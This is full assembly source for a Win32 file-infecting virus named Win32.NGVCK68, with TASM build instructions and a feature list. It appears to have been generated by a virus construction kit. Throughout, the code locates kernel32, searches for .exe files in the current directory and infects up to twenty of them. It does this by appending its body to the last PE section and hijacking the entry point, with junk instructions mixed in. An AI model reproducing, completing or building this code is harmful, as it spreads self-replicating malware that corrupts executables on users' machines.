              
;
;
; Win32.NGVCK68 by SnakeByte
;
; This Virus is created with the Next Generation VCK by SnakeByte
; to get a copy of this Virus Construction Kit check www.kryptocrew.de/snakebyte/
;
; Virus Description : 
;
;  Virusname              : Win32.NGVCK68
;  Author                 : SnakeByte
;  Operating System       : Win32 ( Win9x, NT, ME, 2000 )
;  Target Files           : Windows Portable Executable
;  Created with           : Next Generation VCK 0.45
;  Creation Date          : 3/12/2015
;  Infection Mark         : NGVC
;  Infection Type         : increasing last section
;  API Search             : Simple CRC I
;  Entry Point Obscurity  : No
;  Locate Kernel by       : searching on fixed locations
;  Anti Bait              : No
;  Travelling             : No
;  Encrypt Hostcode       : No
;  Per-Process Residency  : No
;  SelfMailing            : No
;  mIRC Spreading         : No
;  Trash Ratio            : 1 to 30
;  No. of Files to infect : 20
;
;
;
; Compile this source code with (TASM 5.0) : 
;
;     tasm32 /z /ml /m3 <FileName>,,;
;     tlink32 -Tpe -c <FileName>,<FileName>,, import32.lib
;
; If you edit this source or create another virus from this,
; then please send me a copy so that I know what else I could add
;    Hope you enjoy this ... SnakeByte [ SnakeByte@kryptocrew.de ]
;

.586p
.model flat
jumps
.radix 16

 extrn ExitProcess:PROC

.data
 VirusSize equ (offset EndVirus - offset Virus )
 NumberOfApis equ 8d

VirusCode:
                                        ; we add some nop's to make the offsets
                                        ; more variable, these nops will not be copied
                                        ; with the virus !
 db 58351 dup(90h)
Virus:
 call Delta                             ; Get Delta Offset

Delta:
 pop ebp
 sub ebp, offset Delta
 jmp KernelSearchStart


;      [ ///// * Prepare Infection Procedure * \\\\\ ]

InfectFile:                             ; Infect a file
                                        ; check for maximum filesize
 lea esi, [ebp+WFD_nFileSizeHigh]
 xchg edx, esi

 cmp dword ptr [edx], 0
 jne NoInfection
                                        ; check for minimum filesize
 lea edx, [ebp+WFD_nFileSizeLow]
 xchg ecx, edx

 cmp dword ptr [ecx], 20000d
 jbe NoInfection
 call OpenFile                          ; open the file
 jc NoInfection
                                        ; check for EXE File
                                        ; mov edi, -1
 mov edi, ( -1d + 4d )
 sub edi, 4d
 and edi, dword ptr [ebp+MapAddress]
                                        ; check for ZM
 cmp word ptr [edi], 'ZM'
 je Goodfile
                                        ; mov eax, 52840
 mov eax, 52840d
 cmp eax, 52840d
 shl ecx, 1d                            ; Trash
 je Notagoodfile

Goodfile:
                                        ; clear ecx
 xor ecx, ecx
 mov cx, word ptr [edi+3Ch]
 test ecx, ecx
 jz Notagoodfile
 push dword ptr [edi+3Ch]
 pop esi
                                        ; check if header lies inside the file
 cmp dword ptr [ebp+WFD_nFileSizeLow],esi
 jb Notagoodfile
 add esi, edi
                                        ; check for PE Header
                                        ; check for EP
 cmp word ptr [esi], 'EP'
 je Goodfile2
 jmp Notagoodfile

Goodfile2:
                                        ; check for previous Infection
 cmp dword ptr [esi+4Ch], 'NGVC'
 jnz yNotagoodfile
 jmp Notagoodfile
yNotagoodfile:
 call InfectEXE                         ; Infect the file
 jnc Notagoodfile
 jmp NoInfection

Notagoodfile:
 call UnMapFile

NoInfection:
ret




;          [ ///// * APISearch 1 Procedure * \\\\\ ]

                                        ; edi Points to API-CRC ( Virus )

SearchAPI1:                             ; Procedure to retrieve API Offsets
 pushad




                                        ; mov ecx, -1
 mov ecx, 0
 add ecx, -1d
 and ecx, dword ptr [ebp+NTableVA]


SearchNextApi1:                         ; search for the API's
 push ecx
 mov ebx, dword ptr [ecx]
 add ebx, [ebp+KernelMZ]
                                        ; mov ecx, ebx
                                        ; clear ecx
 mov ecx, -18437d
 add ecx, 18437d
 add ecx, ebx
                                        ; mov esi, ecx
 push ecx
 pop esi
 push esi
 push edi
 cld

                                        ; esi Points to API-Name ( Kernel )
                                        ; edi Points to API-Name CRC ( Virus )
                                        ; compare Names
                                        ; simple CRC Api Search by Lethalmind
 push dword ptr [edi]
 pop eax
 LoopChsksm:
                                        ; clear ebx
 and ebx, 0
 mov bl, byte ptr [esi]
                                        ; add esi, 1
 inc esi
 shl bx,8d
 sub eax, ebx
 test bx, bx
 jz LoopConti
                                        ; clear ebx
 push 0
 pop ebx
 mov bl, byte ptr [esi]
                                        ; add esi, 1
 sub esi, -1d
 sub eax, ebx
 test bx, bx
 jnz LoopChsksm
LoopConti:
 test eax, eax
 jz FoundApi1

ApiNotFound:                            ; we did not find it :(
 pop edi
 pop esi
 pop ecx
                                        ; add ecx, 4
 inc ecx
 add ecx, 3d
 add word ptr [ebp+counter], 1h
 cmp word ptr [ebp+counter], 2001h
 jne SearchNextApi1
 jmp NotFoundApi1

FoundApi1:                              ; we found the API
                                        ; clear Stack
 pop edi
 pop esi
 pop edi
                                        ; retrieve the offset
 movzx edx, word ptr [ebp+counter]
                                        ; point to ordinal Table
 shl edx, 1                             ; multiply with 2
 add edx, dword ptr [ebp+OTableVA]
 push edx
 pop ecx
                                        ; clear edx
 and edx, 0
 mov ebx, 39156941d                     ; Trash
 mov dx, word ptr [ecx]
 clc
 rcl edx, 2h
 add edx, dword ptr [ebp+ATableVA]
                                        ; convert to RVA
                                        ; clear ebx
 push 0
 pop ebx
 xor ebx, dword ptr [ebp+KernelMZ]
 add ebx, dword ptr [edx]
 mov dword ptr [ebp+TempAPI], -1
 and dword ptr [ebp+TempAPI], ebx
 popad
ret

NotFoundApi1:
                                        ; we did not get one of the nessecairy API's
                                        ; so we quit !
 pop ebx
 popad
 jmp ExecuteHost



;          [ ///// * FindFiles Procedure * \\\\\ ]


FindNextFileProc:                       ; find another file
 call ClearOldData
 lea edi, [ebp+WIN32_FIND_DATA]
 add dword ptr [ebp+Trash1], 1947938    ; Trash
 xchg edi, esi

 push esi
                                        ; mov ecx, -1
 push -1d
 pop ecx
 and ecx, dword ptr [ebp+FindHandle]
 push ecx
 call dword ptr [ebp+XFindNextFileA]
ret

                                        ; Find the first file
FindFirstFileProc:
 call ClearOldData
 mov ebx, ebp
 add ebx, offset WIN32_FIND_DATA

 push ebx
 push eax
 call dword ptr [ebp+XFindFirstFileA]
 mov dword ptr [ebp+FindHandle], 0
 add dword ptr [ebp+FindHandle], eax
ret


ClearOldData:                           ; we don't want waste in the fields
 pushad
                                        ; mov ecx, 276
 push 276d
 pop ecx
 lea edx, [ebp+WFD_szFileName]


ClearOldData2:
 mov byte ptr [edx], 0h
                                        ; add edx, 1
 inc edx
 dec ecx
 jnz ClearOldData2
 popad
ret





;                  [ ///// * Data * \\\\\ ]

Data:
 OldBase     dd 400000h
 InfCounter  dd 0h
 TempAPI     dd 0h
 NewEIP      dd 0h
 AlignReg1   dd 0h
 OTableVA    dd 0h
 AlignReg2   dd 0h
 filemask    db '*.eXe',0
 OldEIP      dd 0h

 APIOffsets:
 XCloseHandle           dd 0h
 XMapViewOfFile         dd 0h
 XCreateFileMappingA    dd 0h
 XCreateFileA           dd 0h
 XUnmapViewOfFile       dd 0h
 XFindClose             dd 0h
 XFindNextFileA         dd 0h
 XFindFirstFileA        dd 0h

 KernelPE    dd 0h
 FILETIME                STRUC
 FT_dwLowDateTime        dd       ?
 FT_dwHighDateTime       dd       ?
 FILETIME ENDS

 WIN32_FIND_DATA         label    byte
 WFD_dwFileAttributes    dd       ?
 WFD_ftCreationTime      FILETIME ?
 WFD_ftLastAccessTime    FILETIME ?
 WFD_ftLastWriteTime     FILETIME ?
 WFD_nFileSizeHigh       dd       ?
 WFD_nFileSizeLow        dd       ?
 WFD_dwReserved0         dd       ?
 WFD_dwReserved1         dd       ?
 WFD_szFileName          db       260d dup (?)
 WFD_szAlternateFileName db       13   dup (?)
 WFD_szAlternateEnding   db       03   dup (?)

 FileHandle  dd 0h
 ATableVA    dd 0h

 APINames:
 dd 'Cl'+'os'+'eH'+'an'+'dl'+'e'*100h
 dd 'Ma'+'pV'+'ie'+'wO'+'fF'+'il'+'e'*100h
 dd 'Cr'+'ea'+'te'+'Fi'+'le'+'Ma'+'pp'+'in'+'gA'
 dd 'Cr'+'ea'+'te'+'Fi'+'le'+'A'*100h
 dd 'Un'+'ma'+'pV'+'ie'+'wO'+'fF'+'il'+'e'*100h
 dd 'Fi'+'nd'+'Cl'+'os'+'e'*100h
 dd 'Fi'+'nd'+'Ne'+'xt'+'Fi'+'le'+'A'*100h
 dd 'Fi'+'nd'+'Fi'+'rs'+'tF'+'il'+'eA'

 FindHandle  dd 0h
 db 'Virus : Win32.NGVCK68 Author : SnakeByte',0
 NewSize     dd 0h
 KernelMZ    dd 0h
 NTableVA    dd 0h
 MapAddress  dd 0h
 Trash1      dd 0h
 MapHandle   dd 0h
 counter     dw 0h




;        [ ///// * Search Kernel Procedure * \\\\\ ]

KernelSearchStart:
                                        ; get Kernel by using hardcoded values
 mov edx, 077f00000h
 call GetKernel32
 jnc GetApis
 mov edx, 077e00000h
 call GetKernel32
 jnc GetApis
 mov edx, 0bff70000h
 call GetKernel32
 jnc GetApis

 jmp NoKernel
GetKernel32:
 pushad
                                        ; clear ebx
 mov ebx, 2121d
 sub ebx, 2121d

 lea eax, dword ptr [esp-8h]
 xchg eax, dword ptr fs:[ebx]
 lea ecx, [ebp+GetKernel32Exception]
 xchg edi, ecx

 push edi
 dec ecx                                ; Trash
 push eax

                                        ; add edx, 1
 sub edx, -1d
GetKernelLoop:
                                        ; clear ecx
 mov ecx, -4998d
 add ecx, 4998d
 add edx, -1
 mov cx, word ptr [edx+03ch]
 test cx,0f800h
 jnz GetKernelLoop
 cmp edx, dword ptr [edx+ecx+34h]
 jnz GetKernelLoop
 mov dword ptr [ebp+KernelMZ], -1
 and dword ptr [ebp+KernelMZ], edx
 mov eax, [edx+3Ch]
 add eax, edx
 mov [KernelPE+ebp], eax
 mov edi, dword ptr [ebp+KernelPE]
                                        ; get Export-Table
                                        ; clear edx
 mov edx, 0
 add edx, [edi+78h]
 add edx, [ebp+KernelMZ]
 sub dword ptr [ebp+Trash1], eax        ; Trash
                                        ; add edx, 28
 inc edx
 add edx, 27d
                                        ; get ATableVA
 mov edi, dword ptr [edx]
 add edi, [ebp+KernelMZ]
 mov dword ptr [ebp+ATableVA], edi
                                        ; add edx, 4
 add edx, 4d
                                        ; get NTableVA
 mov edi, dword ptr [edx]
 add edi, [ebp+KernelMZ]
                                        ; add edx, 4
 add edx, 4d
 mov dword ptr [ebp+NTableVA], edi
                                        ; get OTableVA
 mov edi, dword ptr [edx]
 add edi, [ebp+KernelMZ]
 mov dword ptr [ebp+OTableVA], edi
                                        ; clear eax
 mov eax, 23895d
 sub eax, 23895d

 pop dword ptr fs:[eax]
 pop ebx
 popad
 clc
ret

GetKernel32Exception:
                                        ; clear ecx
 and ecx, 0

 mov edx, dword ptr fs:[ecx]
 mov esp, dword ptr [edx]
GetKernel32NotFound:
                                        ; clear ecx
 mov ecx, 45419d
 sub ecx, 45419d

 pop dword ptr fs:[ecx]
 pop ebx
 popad
 stc
ret


;           [ ///// * Outbreak Procedure * \\\\\ ]


Outbreak:                               ; Lets infect some files...


;   [ ///// * Infect Current Directory Procedure * \\\\\ ]

InfectCurDir:                           ; Infect the current directory
 lea ebx, [ebp+filemask]
 xchg eax, ebx

                                        ; Find File to infect
 call FindFirstFileProc
 inc eax
 jz EndInfectCurDir
                                        ; Set Infection Counter
                                        ; mov edi, 20
 mov edi, 20d
 mov dword ptr [ebp+InfCounter], 0
 xor dword ptr [ebp+InfCounter], edi

InfectCurDirFile:                       ; Infect the file
 call InfectFile
                                        ; Check Infection Counter
 cmp [ebp+InfCounter], 0h
 je EndInfectCurDir
                                        ; find more Files
 call FindNextFileProc
 or eax, eax
 jnz InfectCurDirFile

EndInfectCurDir:
                                        ; Close the Handle
                                        ; clear edx
 mov edx, -26179d
 add edx, 26179d
 add edx, dword ptr [ebp+FindHandle]
 push edx
 rcl ebx, 7d                            ; Trash
 call dword ptr [ebp+XFindClose]

 jmp ExecuteHost


;          [ ///// * APISearch - Procedure * \\\\\ ]


GetApis:                                ; Retrive the APIs we need

                                        ; store old EIP and ImageBase
                                        ; clear esi
 sub esi, esi
 add esi, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], 0
 add dword ptr [ebp+retEIP], esi

                                        ; clear ecx
 sub ecx, ecx
 xor ecx, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], -1
 and dword ptr [ebp+retBase], ecx



                                        ; number of API's we're looking for
 push NumberOfApis
 pop edx
 and eax, eax                           ; Trash

                                        ; load API Names and Offsets
 lea eax, [ebp+APIOffsets]

 mov edi, offset APINames
 add edi, ebp


GetApisLoop: 
                                        ; clear the counter
 mov word ptr [ebp+counter], 0h

                                        ; search 'em
                                        ; edi points to the CRC
                                        ; eax points to the offset

 call SearchAPI1
                                        ; add edi, 4
 dec edi
 add edi, 5d
                                        ; clear esi
 push 0
 pop esi
 add esi, dword ptr [ebp+TempAPI]
 mov dword ptr [eax], -1
 and dword ptr [eax], esi
                                        ; add eax, 4
 dec eax
 add eax, 5d
 dec edx
 jnz GetApisLoop
 jmp Outbreak



;        [ ///// * File Handling Procedure * \\\\\ ]

                                        ; File Handling
OpenFile:                               ; Open File
                                        ; clear ecx
 mov ecx, 0

 push ecx
 push ecx
 push 3h
 push ecx
                                        ; add ecx, 1
 inc ecx
 push ecx
 mov eax, 80000000h or 40000000h
 push eax
 mov edx, ebp
 add edx, offset WFD_szFileName

 push edx
 call dword ptr [ebp+XCreateFileA]

 add eax, 1
 jz Closed
 sub eax, 1

 push eax
 pop dword ptr [ebp+FileHandle]

CreateMap:                              ; Map the file
 push dword ptr [ebp+WFD_nFileSizeLow]
 pop ebx
 push ebx

                                        ; clear ecx
 push 0
 pop ecx
 push ecx
 push ebx
 push ecx
                                        ; mov edx, 4
 mov edx, ( 4d xor 7d )
 xor edx, 7d
 push edx
 adc dword ptr [ebp+Trash1], 568535     ; Trash
 push ecx
 push dword ptr [ebp+FileHandle]
 call dword ptr [ebp+XCreateFileMappingA]
 mov dword ptr [ebp+MapHandle], 0
 add dword ptr [ebp+MapHandle], eax
 pop ebx
                                        ; add eax, 1
 sub eax, -1d
 dec eax
 jz CloseFile
                                        ; clear ecx
 mov ecx, 0
 push ebx
 push ecx
 push ecx
                                        ; mov edx, 2
 mov edx, ( 2d - 32d )
 add edx, 32d
 push edx
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XMapViewOfFile]
 cmp eax, 0
 je UnMapFile
 mov dword ptr [ebp+MapAddress], -1
 and dword ptr [ebp+MapAddress], eax
 clc
ret

UnMapFile:                              ; Unmap the file and store it to disk
 Call UnMapFile2

CloseFile:                              ; Close the file
 push dword ptr [ebp+FileHandle]
 Call [ebp+XCloseHandle]

Closed:
 stc
ret

UnMapFile2:
 push dword ptr [ebp+MapAddress]
 call dword ptr [ebp+XUnmapViewOfFile]
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XCloseHandle]
ret



;          [ ///// * Execute Original File * \\\\\ ]

NoKernel:
                                        ; store old EIP and ImageBase
                                        ; mov edx, -1
 mov edx, ( -1d - 16d )
 add edx, 16d
 and edx, dword ptr [ebp+OldEIP]

 push edx
 pop dword ptr [ebp+retEIP]

                                        ; clear ebx
 mov ebx, 0
 xor ebx, dword ptr [ebp+OldBase]

 push ebx
 pop dword ptr [ebp+retBase]



ExecuteHost:                            ; Start the infected File

                                        ; check if we are first generation
                                        ; add ebp, 1
 sub ebp, -1d
 dec ebp
 jz FirstGenHost
 mov eax,12345678h
 org $-4
 retBase dd 0h
 add eax,12345678h
 org $-4
 retEIP dd 0h
 jmp eax



;            [ ///// * Align Procedure * \\\\\ ]

Align:                                  ; align File or Section Size
 pushad
                                        ; clear edx
 push 0
 pop edx
 mov eax, dword ptr [ebp+AlignReg1]
 mov ebx, dword ptr [ebp+AlignReg2]
 div ebx
                                        ; add eax, 1
 inc eax
 mul ebx
 mov dword ptr [ebp+AlignReg1], 0h
 add ecx, 95080351d                     ; Trash
 add dword ptr [ebp+AlignReg1], eax
 popad
ret



;      [ ///// * EXE FILE Infection Procedure * \\\\\ ]

InfectEXE:                              ; infect an exe file
 push dword ptr [ebp+MapAddress]
 pop edx
                                        ; retrieve PE - Header
 mov edi, edx
 add edi, [edx+3Ch]
                                        ; get File Alignment
 mov ecx, [edi+3Ch]
                                        ; mov eax, -1
 push -1d
 pop eax
 and eax, dword ptr [ebp+WFD_nFileSizeLow]
                                        ; calculate new size
 add eax, VirusSize
 mov dword ptr [ebp+AlignReg1], -1
 and dword ptr [ebp+AlignReg1], eax
 push ecx
 pop dword ptr [ebp+AlignReg2]
 call Align
                                        ; clear eax
 sub eax, eax
 add eax, dword ptr [ebp+AlignReg1]
                                        ; unmap file and map it again with new size
 mov dword ptr [ebp+NewSize], 0
 add dword ptr [ebp+NewSize], eax
 pushad
 Call UnMapFile2
 popad
 mov dword ptr [ebp+WFD_nFileSizeLow], -1
 and dword ptr [ebp+WFD_nFileSizeLow], eax
 call CreateMap
 jc NoEXE
                                        ; clear esi
 mov esi, -22339d
 add esi, 22339d
 add esi, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header again
 mov ebx, dword ptr [esi+3Ch]
 add ebx, esi
                                        ; infect by increasing the last section
 mov esi, ebx
                                        ; get last section
                                        ; clear eax
 mov eax, 17753d
 sub eax, 17753d
 mov ax, word ptr [esi+06h]
 dec eax
 imul eax, eax, 28h
 add ebx, eax
                                        ; add ebx, 120
 add ebx, 120d
 ror ecx, 9d                            ; Trash
 mov edx, dword ptr [esi+74h]
 shl edx, 3
 add ebx, edx
                                        ; get old Entrypoint
 mov edx, dword ptr [esi+28h]
 push edx
 pop dword ptr [ebp+OldEIP]
 mov ecx, dword ptr [esi+34h]
 mov dword ptr [ebp+OldBase], 0
 add dword ptr [ebp+OldBase], ecx
 mov eax, [ebx+10h]
                                        ; mov ecx, eax
 mov ecx, eax
 add ebx, 14h
 add eax, [ebx]
 sub ebx, 14h
 push eax
 mov edx, ecx
 add edx, [ebx+0Ch]
 push edx
 pop dword ptr [ebp+NewEIP]
                                        ; save new enty point in file
 mov dword ptr [esi+28h], edx
                                        ; clear edx
 mov edx, 32266d
 sub edx, 32266d

 add edx, [ebx+10h]
 push edx
                                        ; calculate new section size
 add edx, VirusSize
 mov dword ptr [ebp+AlignReg1], 0
 xor dword ptr [ebp+AlignReg1], edx
 push dword ptr [esi+3Ch]
 pop dword ptr [ebp+AlignReg2]
 call Align
                                        ; clear edx
 xor edx, edx
 add edx, dword ptr [ebp+AlignReg1]
 mov dword ptr [ebx+10h], 0h
 add dword ptr [ebx+10h], edx
 pop edx
 add edx, VirusSize
 mov dword ptr [ebx+08h], 0
 add dword ptr [ebx+08h], edx
 mov edx, dword ptr [ebx+0Ch]
 add edx, dword ptr [ebx+10h]
 mov dword ptr [esi+50h], 0h
 add dword ptr [esi+50h], edx
                                        ; set write, read and code flag
 or dword ptr [ebx+24h], 0A0000020h
                                        ; set infection mark
 mov dword ptr [esi+4Ch], 0h
 add dword ptr [esi+4Ch], 'NGVC'
                                        ; Append Virus
 pop edi
 add edi, dword ptr [ebp+MapAddress]
 mov eax, VirusSize
 mov esi, offset Virus
 add esi, ebp


AppendLoop:
 movsb
 dec eax
 jnz AppendLoop
                                        ; decrease Infection Counter
                                        ; clear ebx
 sub ebx, ebx
 xor ebx, dword ptr [ebp+InfCounter]
 add ebx, -1
 mov dword ptr [ebp+InfCounter], 0
 add dword ptr [ebp+InfCounter], ebx
 clc
ret

NoEXE:
 stc
ret



CryptEnd:
EndVirus:

;          [ //////////////////\\\\\\\\\\\\\\\\\\\ ]
;          [ ///// * First Generation Host * \\\\\ ]


.code                                   ; Lets place some code
                                        ; to start the virus
                                        ; which is inside the
                                        ; data section
FakeCode:

 push offset VirusCode

 ret


FirstGenHost:                           ; exit for the first generation
 push 0h
 call ExitProcess



end FakeCode

